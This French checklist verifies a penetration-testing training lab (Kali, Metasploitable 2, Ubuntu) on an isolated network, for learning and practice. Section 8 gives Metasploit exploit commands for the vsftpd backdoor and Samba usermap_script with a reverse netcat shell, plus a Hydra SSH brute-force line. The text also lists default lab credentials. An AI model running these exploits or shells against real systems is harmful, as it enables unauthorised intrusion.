# ✅ Checklist de Vérification du Lab de Cybersécurité

---

## 📦 1. Pré-installation

### Matériel requis
- [ ] **CPU** : Minimum 4 cœurs (8 recommandés)
- [ ] **RAM** : Minimum 16 GB (32 GB recommandés)
- [ ] **Stockage** : Minimum 100 GB d'espace libre
- [ ] **Virtualisation** : VT-x/AMD-V activé dans le BIOS

### Logiciels prérequis
- [ ] VirtualBox 7.0+ **OU** VMware Workstation **OU** Docker
- [ ] Vagrant (optionnel pour automatisation)
- [ ] Git
- [ ] Connexion Internet stable

---

## 💻 2. Installation de l'environnement

### Option A : Docker
- [ ] Docker installé et fonctionnel
- [ ] Docker Compose installé
- [ ] Test : `docker --version` fonctionne
- [ ] Test : `docker-compose --version` fonctionne
- [ ] Répôt cloné localement
- [ ] Exécution de `docker-compose up -d` réussie
- [ ] Vérification : `docker-compose ps` affiche tous les conteneurs "Up"

### Option B : Vagrant
- [ ] Vagrant installé
- [ ] VirtualBox installé
- [ ] Test : `vagrant --version` fonctionne
- [ ] Exécution de `vagrant up` réussie
- [ ] Vérification : `vagrant status` affiche "running"

### Option C : Installation manuelle
- [ ] Kali Linux ISO téléchargé
- [ ] Metasploitable 2 ISO téléchargé
- [ ] Ubuntu Server ISO téléchargé
- [ ] VMs créées dans VirtualBox/VMware
- [ ] Scripts d'installation exécutés

---

## 🔌 3. Configuration Réseau

### Configuration de base
- [ ] Réseau 192.168.100.0/24 créé
- [ ] Passerelle configurée (192.168.100.1)
- [ ] Mode réseau : Internal ou Host-Only activé
- [ ] IP forwarding activé (si nécessaire)

### Adresses IP assignées
- [ ] **Kali Linux** : 192.168.100.10
- [ ] **Metasploitable** : 192.168.100.20
- [ ] **Ubuntu Server** : 192.168.100.30
- [ ] **DVWA** (optionnel) : 192.168.100.40

### Tests de connectivité
```bash
ping -c 4 192.168.100.10  # Kali
ping -c 4 192.168.100.20  # Metasploitable
ping -c 4 192.168.100.30  # Ubuntu
```

- [ ] Ping vers Kali réussit
- [ ] Ping vers Metasploitable réussit
- [ ] Ping vers Ubuntu réussit
- [ ] Test du script : `test-lab-network` (si installé)

---

## 🐧 4. Vérification Kali Linux

### Accès et configuration
- [ ] Connexion SSH réussie : `ssh root@192.168.100.10`
- [ ] Mise à jour effectuée : `apt-get update && apt-get upgrade`
- [ ] Script `install_kali.sh` exécuté

### Outils installés
- [ ] **Nmap** : `nmap --version`
- [ ] **Metasploit** : `msfconsole --version`
- [ ] **Burp Suite** : `burpsuite --version`
- [ ] **Hydra** : `hydra -h`
- [ ] **Wireshark** : `wireshark --version`
- [ ] **SQLMap** : `sqlmap --version`
- [ ] **Nikto** : `nikto -Version`
- [ ] **John** : `john --version`
- [ ] **Netcat** : `nc -h`

### Base Metasploit
- [ ] PostgreSQL démarré : `systemctl status postgresql`
- [ ] Base MSF initialisée : `msfdb status`
- [ ] Test Metasploit : `msfconsole` se lance sans erreur

### Structure de dossiers
- [ ] `/root/lab/recon` existe
- [ ] `/root/lab/exploit` existe
- [ ] `/root/lab/loot` existe
- [ ] `/root/lab/reports` existe
- [ ] `/root/lab/scripts` existe

---

## 🎯 5. Vérification Metasploitable

### Accès
- [ ] Connexion SSH : `ssh msfadmin@192.168.100.20` (password: msfadmin)
- [ ] Script `setup_metasploitable.sh` exécuté

### Services actifs
Vérifier depuis Kali avec : `nmap -sV 192.168.100.20`

- [ ] **FTP (21)** : vsftpd actif
- [ ] **SSH (22)** : OpenSSH actif
- [ ] **Telnet (23)** : telnetd actif
- [ ] **HTTP (80)** : Apache actif
- [ ] **SMB (139, 445)** : Samba actif
- [ ] **MySQL (3306)** : MySQL actif
- [ ] **PostgreSQL (5432)** : PostgreSQL actif
- [ ] **Tomcat (8180)** : Tomcat actif

### Test d'accès web
- [ ] `curl http://192.168.100.20` retourne une page HTML
- [ ] Navigateur : http://192.168.100.20 accessible

### FTP anonyme
- [ ] Test : `ftp 192.168.100.20` avec anonymous/anonymous fonctionne

---

## 🐧 6. Vérification Ubuntu Server

### Accès
- [ ] Connexion SSH : `ssh testuser@192.168.100.30` (password: password123)

### Services LAMP
- [ ] **Apache** : `systemctl status apache2`
- [ ] **MySQL** : `systemctl status mysql`
- [ ] **PHP** : `php --version`

### Test d'accès web
- [ ] `curl http://192.168.100.30` retourne une page HTML
- [ ] Navigateur : http://192.168.100.30 accessible

---

## 🔍 7. Tests de Scan & Reconnaissance

### Test 1 : Découverte réseau
Depuis Kali :
```bash
nmap -sn 192.168.100.0/24
```
- [ ] Kali (192.168.100.10) détecté
- [ ] Metasploitable (192.168.100.20) détecté
- [ ] Ubuntu (192.168.100.30) détecté

### Test 2 : Scan de ports
Depuis Kali :
```bash
nmap -sS -sV -p- 192.168.100.20
```
- [ ] Scan complète avec succès
- [ ] Services identifiés correctement
- [ ] Versions détectées

### Test 3 : Énumération SMB
Depuis Kali :
```bash
enum4linux -a 192.168.100.20
```
- [ ] Information SMB récupérée
- [ ] Utilisateurs énumérés
- [ ] Partages listés

---

## 💣 8. Tests d'Exploitation

### Test 1 : vsftpd backdoor
Depuis Kali :
```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.100.20
exploit
```
- [ ] Exploit lancé sans erreur
- [ ] Session shell obtenue
- [ ] Commande `id` retourne uid=0 (root)

### Test 2 : Samba usermap_script
Depuis Kali :
```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOST 192.168.100.20
set PAYLOAD cmd/unix/reverse_netcat
set LHOST 192.168.100.10
exploit
```
- [ ] Exploit réussit
- [ ] Shell obtenu

### Test 3 : Brute-force SSH
Depuis Kali :
```bash
hydra -l msfadmin -p msfadmin ssh://192.168.100.20
```
- [ ] Mot de passe trouvé : msfadmin

---

## 🔒 9. Sécurité & Isolation

### Vérifications de sécurité
- [ ] Lab isolé du réseau principal
- [ ] Pas d'accès Internet direct depuis les cibles (si souhaité)
- [ ] Firewall hôte actif
- [ ] VMs non exposées à Internet
- [ ] Snapshots créés pour restauration rapide

### Bonnes pratiques
- [ ] Documentation de la topologie réseau créée
- [ ] Fichier d'informations `/root/lab-network-info.txt` présent
- [ ] Fichier Metasploitable `/root/metasploitable-info.txt` présent

---

## 📊 10. Outils Additionnels (Optionnel)

### Wireshark / Network Analyzer
- [ ] Wireshark installé
- [ ] Interface de capture configurée
- [ ] Capture de test réussie

### Splunk SIEM (si installé)
- [ ] Splunk démarré
- [ ] Accès web : http://localhost:8000
- [ ] Login : admin / ChangeMeNow!

### Suricata IDS (si installé)
- [ ] Suricata démarré
- [ ] Logs générés dans `/var/log/suricata/`

---

## 📝 11. Documentation

### Templates présents
- [ ] `rapport_lab_template.md` disponible
- [ ] `commandes_essentielles.md` disponible
- [ ] Checklists téléchargées

### Création de rapports
- [ ] Dossier `/root/lab/reports` prêt
- [ ] Template de rapport testé

---

## ✅ 12. Vérification Finale

### Checklist globale
- [ ] Toutes les VMs fonctionnent
- [ ] Connectivité réseau opérationnelle
- [ ] Outils de pentesting installés et fonctionnels
- [ ] Au moins 1 exploitation réussie
- [ ] Documentation accessible
- [ ] Snapshots de sauvegarde créés
- [ ] Lab isolé et sécurisé

### Commande de test global
```bash
# Exécuter depuis Kali
test-lab-network
```

---

## 🚨 Dépannage

### Problèmes courants

#### Les VMs ne communiquent pas
- [ ] Vérifier que toutes les VMs sont sur le même réseau
- [ ] Vérifier les IPs avec `ip addr`
- [ ] Vérifier le pare-feu : `iptables -L`
- [ ] Tester avec `ping`

#### Metasploit ne démarre pas
- [ ] Vérifier PostgreSQL : `systemctl status postgresql`
- [ ] Réinitialiser la DB : `msfdb reinit`
- [ ] Vérifier les logs : `tail -f /var/log/postgresql/*.log`

#### Services ne démarrent pas
- [ ] Vérifier les logs : `journalctl -xe`
- [ ] Vérifier les permissions
- [ ] Redémarrer le service : `systemctl restart service_name`

#### Docker : conteneurs ne démarrent pas
- [ ] Vérifier les logs : `docker-compose logs`
- [ ] Vérifier l'espace disque : `df -h`
- [ ] Redémarrer : `docker-compose down && docker-compose up -d`

---

## 🎓 Prochaines Étapes

Une fois le lab vérifié et fonctionnel :

1. ✅ **Commencer les exercices** de l'ebook
2. ✅ **Documenter chaque test** avec les templates
3. ✅ **Créer des snapshots** réguliers
4. ✅ **Pratiquer quotidiennement**
5. ✅ **Rejoindre des CTF** en ligne
6. ✅ **Partager vos découvertes** avec la communauté

---

**🎉 Félicitations ! Votre lab est maintenant opérationnel !**

⚠️ **Rappel** : Ce lab contient des systèmes volontairement vulnérables. **NE JAMAIS** l'exposer à Internet ou à un réseau de production.
